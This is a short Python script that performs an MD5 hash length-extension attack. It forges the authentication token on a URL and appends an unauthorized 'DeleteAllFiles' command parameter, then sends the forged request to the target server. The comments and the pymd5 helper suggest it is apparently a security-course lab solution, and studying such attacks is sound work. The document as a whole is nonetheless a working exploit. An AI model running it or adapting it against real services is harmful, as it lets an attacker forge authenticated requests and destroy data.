#!/usr/bin/env python
import os
import sys
import math
import httplib, urlparse, urllib
from pymd5 import md5, padding

url = sys.argv[1]
h = md5()

#command to length extension attack with
command = "DeleteAllFiles"

parsed_url = urlparse.urlparse(url)
url_parts = {key : value for (key, value) in 
             [pair.split('=') for pair in parsed_url.query.split('&')]}
next_cmd = max([int(key[-1]) for key in url_parts.keys() if key[:-1] == 'command']) + 1
# note: +2 is for & preceding key and = between key=val, and -1 is for & missing from first key ("user")
m = sum([len(k) + len(url_parts[k]) + 2 for k in url_parts.keys() if k != 'token']) - 1 + 8
cmd3 = "&command" + str(next_cmd) + "=" + command
paddedCmd3 = urllib.quote(padding(m * 8)) + cmd3

#update the token using the md5 module
h = md5(state=url_parts["token"].decode("hex"), count=512)
h.update(cmd3)
new_token = h.hexdigest()

#make a new url from the new token with the new command
url = str.replace(url, url_parts["token"], new_token) + paddedCmd3

#code given to connect to server and send requests
parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
